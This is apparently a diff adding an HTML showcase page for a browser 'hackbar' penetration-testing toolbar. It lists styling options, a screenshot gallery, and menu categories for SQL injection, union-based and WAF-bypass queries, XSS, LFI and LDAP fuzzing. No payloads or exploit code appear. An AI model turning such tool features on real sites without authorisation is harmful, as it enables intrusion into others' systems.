+        <li><span class="check">&check;</span>Text-Color</li>
+        <li><span class="check">&check;</span>Background-Color</li>
+        <li><span class="check">&check;</span>Border-Top</li>
+        <li><span class="check">&check;</span>Border-left</li>
+        <li><span class="check">&check;</span>Border-Bottom</li>
+        <li><span class="check">&check;</span>Border-Right</li>
+        <li><span class="check">&check;</span>Border-Size</li>
+        <li><span class="check">&check;</span>Border-Radius</li>
+        <li><span class="check">&check;</span>Font-Size</li>
+      </ul>
+    </div>
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Font-Family</li>
+        <li><span class="check">&check;</span>Font-Style (bold & italic)</li>
+      </ul>
+    </div>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+    <h3>Replace Field</h3>
+  </div>
+  <div class="column">
+    <img src="images/replace.png"  onclick="openModal();currentSlide(4)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Text-Color</li>
+        <li><span class="check">&check;</span>Background-Color</li>
+        <li><span class="check">&check;</span>Border-Top</li>
+        <li><span class="check">&check;</span>Border-left</li>
+        <li><span class="check">&check;</span>Border-Bottom</li>
+        <li><span class="check">&check;</span>Border-Right</li>
+        <li><span class="check">&check;</span>Border-Size</li>
+        <li><span class="check">&check;</span>Border-Radius</li>
+        <li><span class="check">&check;</span>Font-Size</li>
+      </ul>
+    </div>
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Font-Family</li>
+        <li><span class="check">&check;</span>Font-Style (bold & italic)</li>
+      </ul>
+    </div>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+    <h3>Menupopup</h3>
+  </div>
+  <div class="column">
+    <img src="images/menupopup.png"  onclick="openModal();currentSlide(6)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Text-Color</li>
+        <li><span class="check">&check;</span>Background-Color</li>
+        <li><span class="check">&check;</span>Border-Top</li>
+        <li><span class="check">&check;</span>Border-left</li>
+        <li><span class="check">&check;</span>Border-Bottom</li>
+        <li><span class="check">&check;</span>Border-Right</li>
+        <li><span class="check">&check;</span>Border-Size</li>
+        <li><span class="check">&check;</span>Border-Radius</li>
+        <li><span class="check">&check;</span>Font-Size</li>
+      </ul>
+    </div>
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Opacity</li>
+        <li><span class="check">&check;</span>Font-Family</li>
+        <li><span class="check">&check;</span>Font-Style (bold & italic)</li>
+      </ul>
+    </div>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+    <h3>Main Button (load, split, execute)</h3>
+  </div>
+  <div class="column">
+    <img src="images/mainBtn.png"  onclick="openModal();currentSlide(7)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Text-Color</li>
+        <li><span class="check">&check;</span>Background-Color</li>
+        <li><span class="check">&check;</span>Border-Top</li>
+        <li><span class="check">&check;</span>Border-left</li>
+        <li><span class="check">&check;</span>Border-Bottom</li>
+        <li><span class="check">&check;</span>Border-Right</li>
+        <li><span class="check">&check;</span>Border-Size</li>
+        <li><span class="check">&check;</span>Border-Radius</li>
+        <li><span class="check">&check;</span>Font-Size</li>
+      </ul>
+    </div>
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Font-Family</li>
+        <li><span class="check">&check;</span>Font-Style (bold & italic)</li>
+      </ul>
+    </div>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+    <h3>Toolbar button (hackbar layout)</h3>
+  </div>
+  <div class="column">
+    <img src="images/toolbar.png"  onclick="openModal();currentSlide(11)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Text-Color</li>
+        <li><span class="check">&check;</span>Background-Color</li>
+        <li><span class="check">&check;</span>Border-Top</li>
+        <li><span class="check">&check;</span>Border-left</li>
+        <li><span class="check">&check;</span>Border-Bottom</li>
+        <li><span class="check">&check;</span>Border-Right</li>
+        <li><span class="check">&check;</span>Border-Size</li>
+        <li><span class="check">&check;</span>Border-Radius</li>
+        <li><span class="check">&check;</span>Font-Size</li>
+      </ul>
+    </div>
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Font-Family</li>
+        <li><span class="check">&check;</span>Font-Style (bold & italic)</li>
+        <li><span class="check">&check;</span>Upload custom icon</li>
+      </ul>
+    </div>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+    <h3>Custom Arrow Icon</h3>
+    <p>Custom arrow icon you can choose icon or upload icon and you can link from online or url.</p>
+  </div>
+  <div class="column">
+    <img src="images/custom_arrow_icon.png"  onclick="openModal();currentSlide(12)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <div class="list-style">
+    <ul>
+        <li><span class="check">&check;</span>0xHEX (ENCODE)</li>
+        <li><span class="check">&check;</span>0xHEX (DECODE)</li>
+        <li><span class="check">&check;</span>%URL (ENCODE)</li>
+        <li><span class="check">&check;</span>%URL (DECODE)</li>
+        <li><span class="check">&check;</span>BASE64 (ENCODE)</li>
+        <li><span class="check">&check;</span>BASE64 (DECODE)</li>
+        <li><span class="check">&check;</span>0bBINARY (ENCODE)</li>
+        <li><span class="check">&check;</span>0bBINARY (DECODE)</li>
+    </ul>
+  </div>
+  </div>
+  <div class="column">
+    <div class="list-style">
+    <ul>
+        <li><span class="check">&check;</span>REPLACE</li>
+        <li><span class="check">&check;</span>BASE64 SPACER</li>
+        <li><span class="check">&check;</span>Upload Custom Icon</li>
+        <li><span class="check">&check;</span>Choose icon</li>
+    </ul>
+  </div>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+    <h3>Custom Queries</h3>
+  </div>
+  <div class="column">
+    <img src="images/custom_queries.png"  onclick="openModal();currentSlide(14)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+          <li><span class="check">&check;</span>Dios (10 slots)</li>
+          <li><span class="check">&check;</span>XSS (10 slots)</li>
+          <li><span class="check">&check;</span>Others (10 slots)</li>
+      </ul>
+    </div>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+  <h3>Advance (Hide & Remove Style)</h3>
+</div>
+    <p>you can hide toolbars for overflow or not compatible resolution and also remove style <br><b>note:</b> if you remove style this is not back to previous style.</p>
+  <div class="column">
+    <img src="images/advance.png"  onclick="openModal();currentSlide(17)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>  
+        <li><span class="check">&check;</span>SQLI BASIC</li>
+         <li><span class="check">&check;</span>UNION BASED</li>
+        <li><span class="check">&check;</span>OUT FILE</li>
+        <li><span class="check">&check;</span>WAF BYPASSED</li>
+        <li><span class="check">&check;</span>CUSTOM</li>
+        <li><span class="check">&check;</span>ERROR/DOUBLE QUERIES</li>
+        <li><span class="check">&check;</span>TOOLS</li>
+        <li><span class="check">&check;</span>WAF BYPASS</li>
+        <li><span class="check">&check;</span>LDAP FUZZ</li>
+      </ul>
+    </div>
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>ENCODING</li>
+        <li><span class="check">&check;</span>0xHTML</li>
+        <li><span class="check">&check;</span>ENCRYTPTION</li>  
+         <li><span class="check">&check;</span>OTHERS</li>
+         <li><span class="check">&check;</span>XSS</li>
+         <li><span class="check">&check;</span>LFI</li>
+         <li><span class="check">&check;</span>LINKS</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div id="myModal" class="modal">
+  <span class="close cursor" onclick="closeModal()">&times;</span>
+  <div class="modal-content">
+
+    <div class="mySlides">
+      <div class="numbertext">1 / 17</div>
+      <img src="images/customize.png" style="width:100%" class="image-modal-item cursor" alt="Hackbar URL Field">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">2 / 17</div>
+      <img src="images/postdata.png" style="width:100%" class="image-modal-item cursor" alt="POSTDATA URL Field">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">3 / 17</div>
+      <img src="images/referrer.png" style="width:100%" class="image-modal-item cursor" alt="Referrer URL Field">
+    </div>
+    
+    <div class="mySlides">
+      <div class="numbertext">4 / 17</div>
+      <img src="images/replace.png" style="width:100%" class="image-modal-item cursor" alt="Replace Field">
+    </div>
+    
+    <div class="mySlides">
+      <div class="numbertext">5 / 17</div>
+      <img src="images/replace_2.png" style="width:100%" class="image-modal-item cursor" alt="Replace Field 2">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">6 / 17</div>
+      <img src="images/menupopup.png" style="width:100%" class="image-modal-item cursor" alt="Menupopup Button">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">7 / 17</div>
+      <img src="images/mainBtn.png" style="width:100%" class="image-modal-item cursor" alt="Load URL">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">8 / 17</div>
+      <img src="images/mainBtn_split.png" style="width:100%" class="image-modal-item cursor" alt="Split URL">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">9 / 17</div>
+      <img src="images/mainBtn_execute.png" style="width:100%" class="image-modal-item cursor" alt="Execute URL">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">10 / 17</div>
+      <img src="images/mainBtn_selection.png" style="width:100%" class="image-modal-item cursor" alt="Selection">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">11 / 17</div>
+      <img src="images/toolbar.png" style="width:100%" class="image-modal-item cursor" alt="Toolbar Button">
+    </div>
+    
+    <div class="mySlides">
+      <div class="numbertext">12 / 17</div>
+      <img src="images/custom_arrow_icon.png" style="width:100%" class="image-modal-item cursor" alt="Upload Custom Icon">
+    </div>
+    
+    <div class="mySlides">
+      <div class="numbertext">13 / 17</div>
+      <img src="images/custom_arrow_icon_2.png" style="width:100%" class="image-modal-item cursor" alt="Choose Custom Icon">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">14 / 17</div>
+      <img src="images/custom_queries.png" style="width:100%" class="image-modal-item cursor" alt="Custom Dios">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">15 / 17</div>
+      <img src="images/custom_queries_xss.png" style="width:100%" class="image-modal-item cursor" alt="Custom XSS">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">16 / 17</div>
+      <img src="images/custom_queries_other.png" style="width:100%" class="image-modal-item cursor" alt="Custom Others">
+    </div>
+
+    <div class="mySlides">
+      <div class="numbertext">17 / 17</div>
+      <img src="images/advance.png" style="width:100%" class="image-modal-item cursor" alt="Advance">
+    </div>
+    
+    <a class="prev" onclick="plusSlides(-1)">&#10094;</a>
+    <a class="next" onclick="plusSlides(1)">&#10095;</a>
+
+    <div class="caption-container">
+      <p id="caption"></p>
+    </div>
+  </div>
+</div>
+  </div>
+
+  </div>
+  <script type="text/javascript" src="js/hackbar.js"></script>
+  <script type="text/javascript" src="js/image-modal.js"></script>
+  <script type="text/javascript" src="js/image-modal-custom.js"></script>
+  <script type="text/javascript" src="js/new.js"></script>
+</body>
+</html> 
